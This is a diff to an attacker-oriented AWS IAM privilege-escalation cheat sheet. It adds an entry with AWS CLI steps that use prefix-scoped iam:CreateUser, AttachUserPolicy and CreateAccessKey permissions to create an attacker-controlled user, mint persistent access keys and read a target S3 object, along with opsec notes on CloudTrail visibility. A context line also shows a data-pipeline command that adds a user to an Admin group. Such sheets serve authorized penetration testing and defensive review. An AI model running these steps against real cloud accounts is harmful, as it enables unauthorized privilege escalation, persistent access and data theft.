@@ -1,6 +1,6 @@
 # AWS IAM Privilege Escalation Techniques
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ## Shadow Admin Permissions (Admin-Equivalent Without AdministratorAccess Policy)
 
@@ -392,4 +392,29 @@ aws datapipeline put-pipeline-definition \
 # pipeline JSON includes: "command": "aws iam add-user-to-group --group-name Admin --user-name <USER>"
 
 aws datapipeline activate-pipeline --pipeline-id <PIPELINE_ID>
+```
+
+### iam:CreateUser + iam:AttachUserPolicy + iam:CreateAccessKey (Prefix-Scoped User Creation) [added: 2026-05]
+- **Tags:** #AWS #IAM #PrivEsc #CreateUser #AttachUserPolicy #AccessKey #PrefixScope #PersistentAccess
+- **Trigger:** Assumed role has `iam:CreateUser` + `iam:AttachUserPolicy` + `iam:CreateAccessKey` scoped to a username prefix (e.g., `arn:aws:iam::ACCT:user/terraform-dc33-*`); `iam:AttachUserPolicy` is constrained to a specific policy ARN via `ArnEquals` condition
+- **Prereq:** IAM role with prefix-scoped CreateUser + AttachUserPolicy (constrained to a target policy ARN) + CreateAccessKey; attacker controls username under the allowed prefix
+- **Yields:** New IAM user with target policy permissions + persistent access keys; even if policy is read-only (e.g., S3 access), this creates persistent credentials
+- **Opsec:** Med — `CreateUser`, `AttachUserPolicy`, and `CreateAccessKey` all generate CloudTrail events; user creation is visible in IAM console
+- **Context:** Even when `iam:CreateUser` is restricted to a prefix and `iam:AttachUserPolicy` is restricted to a single policy ARN, this triad is a complete priv esc if the target policy grants any useful access. The attacker creates a user they control, attaches the policy, then issues access keys for persistent use. Most common in IaC-deployed roles (Terraform, CDK) designed for limited automation.
+- **Payload/Method:**
+```bash
+# Step 1: Create user under allowed prefix
+aws iam create-user --user-name terraform-dc33-attacker
+
+# Step 2: Attach the restricted policy (ArnEquals condition satisfied by using exact policy ARN)
+aws iam attach-user-policy \
+  --user-name terraform-dc33-attacker \
+  --policy-arn arn:aws:iam::ACCT_ID:policy/S3BucketAccessPolicy
+
+# Step 3: Create access keys for the new user
+aws iam create-access-key --user-name terraform-dc33-attacker
+
+# Step 4: Use the new keys for target access
+AWS_ACCESS_KEY_ID=<new_id> AWS_SECRET_ACCESS_KEY=<new_secret> \
+  aws s3 cp s3://target-bucket/flag.txt -
 ```
